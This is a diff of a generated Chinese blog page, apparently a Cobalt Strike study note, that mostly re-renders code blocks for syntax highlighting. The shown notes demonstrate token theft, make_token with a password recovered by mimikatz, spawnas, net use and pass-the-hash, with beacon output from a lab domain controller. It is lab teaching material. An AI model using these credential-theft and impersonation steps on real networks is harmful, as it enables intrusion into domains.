@@ -437,7 +437,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    1.2k
                 </div>
                 
 
@@ -458,6 +458,9 @@
         </div>
         <hr class="clearfix">
 
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
         
 
         
@@ -489,99 +492,111 @@
 <li>使用 <code>rev2self</code> 移除令牌</li>
 </ul>
 <p>接下来将对这些命令进行演示，目前有一个 SYSTEM 权限的会话，该会话在 WIN-72A8ERDSF2P 主机下，此时想查看 WIN-P2AASSD1AF1 主机下的文件（WIN-P2AASSD1AF1 主机是 TEAMSSIX 域的域控制器），那么直接运行 dir 会提示拒绝访问。</p>
-<pre><code class="powershell">beacon&gt; shell dir \\WIN-P2AASSD1AF1\C$
-[*] Tasked beacon to run: dir \\WIN-P2AASSD1AF1\C$
-[+] host called home, sent: 55 bytes
-[+] received output:
-拒绝访问。</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 55 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
+拒绝访问。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>此时，先用 <code>ps</code> 查看一下当前系统进程信息。</p>
-<pre><code class="powershell">beacon&gt; ps
-[*] Tasked beacon to list processes
-[+] host called home, sent: 12 bytes
-[*] Process List
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> <span class="token function">ps</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to list processes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 12 bytes
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token keyword">Process</span> List
  PID   PPID  Name                         Arch  Session     User
- ---   ----  ----                         ----  -------     -----
- 0     0     [System Process]                               
+ <span class="token operator">--</span><span class="token operator">-</span>   <span class="token operator">--</span>-<span class="token operator">-</span>  <span class="token operator">--</span>-<span class="token operator">-</span>                         <span class="token operator">--</span>-<span class="token operator">-</span>  <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>     <span class="token operator">--</span>-<span class="token operator">--</span>
+ 0     0     <span class="token namespace">[System Process]</span>                               
  4     0     System                       x64   0           NT AUTHORITY\SYSTEM
 ……内容太多，此处省略……
- 3720  524   taskhost.exe                 x64   2           WIN-75F8PRJM4TP\Administrator
- 4092  236   dwm.exe                      x64   3           TEAMSSIX\Administrator</code></pre>
+ 3720  524   taskhost<span class="token punctuation">.</span>exe                 x64   2           WIN<span class="token operator">-</span>75F8PRJM4TP\Administrator
+ 4092  236   dwm<span class="token punctuation">.</span>exe                      x64   3           TEAMSSIX\Administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>通过进程信息可以发现 TEAMSSIX 域下的管理员账户此时在当前 SYSTEM 会话的主机上是登录着的，使用 <code>steal_token [pid]</code> 命令窃取 TEAMSSIX\Administrator 账户的令牌</p>
-<pre><code class="powershell">beacon&gt; steal_token 4092
-[*] Tasked beacon to steal token from PID 4092
-[+] host called home, sent: 12 bytes
-[+] Impersonated TEAMSSIX\administrator</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> steal_token 4092
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to steal token <span class="token keyword">from</span> PID 4092
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 12 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Impersonated TEAMSSIX\administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>查看一下当前会话 uid</p>
-<pre><code class="powershell">beacon&gt; getuid
-[*] Tasked beacon to get userid
-[+] host called home, sent: 8 bytes
-[*] You are TEAMSSIX\administrator (admin)</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> getuid
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to get userid
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 8 bytes
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> You are TEAMSSIX\administrator <span class="token punctuation">(</span>admin<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>再次尝试获取域控制器主机下的文件</p>
-<pre><code class="powershell">beacon&gt; shell dir \\WIN-P2AASSD1AF1\C$
-[*] Tasked beacon to run: dir \\WIN-P2AASSD1AF1\C$
-[+] host called home, sent: 55 bytes
-[+] received output:
- 驱动器 \\WIN-P2AASSD1AF1\C$ 中的卷没有标签。
- 卷的序列号是 F269-89A7
- \\WIN-P2AASSD1AF1\C$ 的目录
-2020/07/16  21:24    &lt;DIR&gt;          Program Files
-2020/07/16  21:52    &lt;DIR&gt;          Program Files (x86)
-2020/07/17  23:00    &lt;DIR&gt;          Users
-2020/07/26  00:55    &lt;DIR&gt;          Windows
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 55 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
+ 驱动器 \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$ 中的卷没有标签。
+ 卷的序列号是 F269<span class="token operator">-</span>89A7
+ \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$ 的目录
+2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:24    &lt;<span class="token function">DIR</span>>          Program Files
+2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:52    &lt;<span class="token function">DIR</span>>          Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>
+2020<span class="token operator">/</span>07<span class="token operator">/</span>17  23:00    &lt;<span class="token function">DIR</span>>          Users
+2020<span class="token operator">/</span>07<span class="token operator">/</span>26  00:55    &lt;<span class="token function">DIR</span>>          Windows
                0 个文件      0 字节
-               4 个目录 28,493,299,712 可用字节</code></pre>
+               4 个目录 28<span class="token punctuation">,</span>493<span class="token punctuation">,</span>299<span class="token punctuation">,</span>712 可用字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs17-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>发现可以成功访问了，使用  <code>rev2self</code> 可移除当前窃取的令牌</p>
-<pre><code class="powershell">beacon&gt; rev2self
-[*] Tasked beacon to revert token
-[+] host called home, sent: 8 bytes</code></pre>
-<p>再次查看 uid 发现变成了原来的 SYSTEM 权限，此时 WIN-P2AASSD1AF1 主机上的文件也拒绝访问了。</p>
-<pre><code class="powershell">beacon&gt; getuid
-[*] Tasked beacon to get userid
-[+] host called home, sent: 8 bytes
-[*] You are NT AUTHORITY\SYSTEM (admin)
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> rev2self
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to revert token
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 8 bytes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-beacon&gt; shell dir \\WIN-P2AASSD1AF1\C$
-[*] Tasked beacon to run: dir \\WIN-P2AASSD1AF1\C$
-[+] host called home, sent: 55 bytes
-[+] received output:
-拒绝访问。</code></pre>
+<p>再次查看 uid 发现变成了原来的 SYSTEM 权限，此时 WIN-P2AASSD1AF1 主机上的文件也拒绝访问了。</p>
+ <pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> getuid
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to get userid
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 8 bytes
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> You are NT AUTHORITY\SYSTEM <span class="token punctuation">(</span>admin<span class="token punctuation">)</span>
+
+beacon> shell <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 55 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
+拒绝访问。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h1 id="0x02-凭证"><a href="#0x02-凭证" class="headerlink" title="0x02 凭证"></a>0x02 凭证</h1><p>1、使用 make_token 创建一个令牌</p>
-<pre><code class="powershell">make_token DOMAIN\user password</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">make_token DOMAIN\user password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>在运行命令之前，需要知道要获取令牌用户的密码，这里可以使用 mimikatz 进行获取，具体的方法可参考<a target="_blank" rel="noopener" href="https://teamssix.com/year/200419-150600.html">《CS学习笔记 | 14、powerup提权的方法》</a>这一节中的介绍。</p>
 <p>这里还是和上文一样的环境，在一个 SYSTEM 会话下，获取 TEAMSSIX\administrator 账号令牌，使用 mimikatz 可以得知 TEAMSSIX\administrator 账号密码为 Test111!，接下来使用 <code>make_token</code> 命令。</p>
-<pre><code class="powershell">beacon&gt; make_token TEAMSSIX\administrator Test111!
-[*] Tasked beacon to create a token for TEAMSSIX\administrator
-[+] host called home, sent: 53 bytes
-[+] Impersonated NT AUTHORITY\SYSTEM
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> make_token TEAMSSIX\administrator Test111<span class="token operator">!</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to create a token <span class="token keyword">for</span> TEAMSSIX\administrator
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 53 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Impersonated NT AUTHORITY\SYSTEM
 
-beacon&gt; shell dir \\WIN-P2AASSD1AF1\C$
-[*] Tasked beacon to run: dir \\WIN-P2AASSD1AF1\C$
-[+] host called home, sent: 55 bytes
-[+] received output:
- 驱动器 \\WIN-P2AASSD1AF1\C$ 中的卷没有标签。
- 卷的序列号是 F269-89A7
- \\WIN-P2AASSD1AF1\C$ 的目录
-2020/07/16  21:24    &lt;DIR&gt;          Program Files
-2020/07/16  21:52    &lt;DIR&gt;          Program Files (x86)
-2020/07/17  23:00    &lt;DIR&gt;          Users
-2020/07/26  00:55    &lt;DIR&gt;          Windows
+beacon> shell <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 55 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
+ 驱动器 \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$ 中的卷没有标签。
+ 卷的序列号是 F269<span class="token operator">-</span>89A7
+ \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$ 的目录
+2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:24    &lt;<span class="token function">DIR</span>>          Program Files
+2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:52    &lt;<span class="token function">DIR</span>>          Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>
+2020<span class="token operator">/</span>07<span class="token operator">/</span>17  23:00    &lt;<span class="token function">DIR</span>>          Users
+2020<span class="token operator">/</span>07<span class="token operator">/</span>26  00:55    &lt;<span class="token function">DIR</span>>          Windows
                0 个文件      0 字节
-               4 个目录 28,493,299,712 可用字节
+               4 个目录 28<span class="token punctuation">,</span>493<span class="token punctuation">,</span>299<span class="token punctuation">,</span>712 可用字节
+               
+beacon> powershell <span class="token function">Invoke-Command</span> <span class="token operator">-</span>computer WIN<span class="token operator">-</span>P2AASSD1AF1 <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">Invoke-Command</span> <span class="token operator">-</span>computer WIN<span class="token operator">-</span>P2AASSD1AF1 <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span>
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 231 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
+teamssix\administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-beacon&gt; powershell Invoke-Command -computer WIN-P2AASSD1AF1 -ScriptBlock &#123;whoami&#125;
-[*] Tasked beacon to run: Invoke-Command -computer WIN-P2AASSD1AF1 -ScriptBlock &#123;whoami&#125;
-[+] host called home, sent: 231 bytes
-[+] received output:
-teamssix\administrator</code></pre>
 <p>当密码输入错误时，执行上面的两个命令就会提示 <code>登录失败: 未知的用户名或错误密码。</code> 同样的使用 <code>rev2self</code> 可除去当前令牌，恢复原来的 SYSTEM 权限。</p>
 <p>2、使用 spawn beacon 替代凭证</p>
-<pre><code class="powershell">spawnas DOMAIN\user password</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">spawnas DOMAIN\user password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>3、在目标上建立账户</p>
-<pre><code class="powershell">net use \\host\C$/USER:DOMAIN\user password</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net use \\host\C$<span class="token operator">/</span>USER:DOMAIN\user password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>这两种方法，在之前的笔记中都或多或少的提及过，这里不再过多赘述。</p>
 <h1 id="0x03-密码哈希"><a href="#0x03-密码哈希" class="headerlink" title="0x03 密码哈希"></a>0x03 密码哈希</h1><p>使用 mimikatz 获取密码哈希</p>
-<pre><code>pth DOMAIN\user ntlmhash</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">pth DOMAIN\user ntlmhash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>如何工作的？</p>
 <p>1、mimikatz 使用登录令牌开启了一个进程，在单点登录信息那里填入我们提供的用户名称、域、密码哈希值</p>
 <p>2、cobalt strike 自动的从那个进程中窃取令牌并关闭</p>
@@ -1016,7 +1031,7 @@ teamssix\administrator</code></pre>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">162.6k</span>&nbsp;字
+                class="white-color">164k</span>&nbsp;字
             
             
             
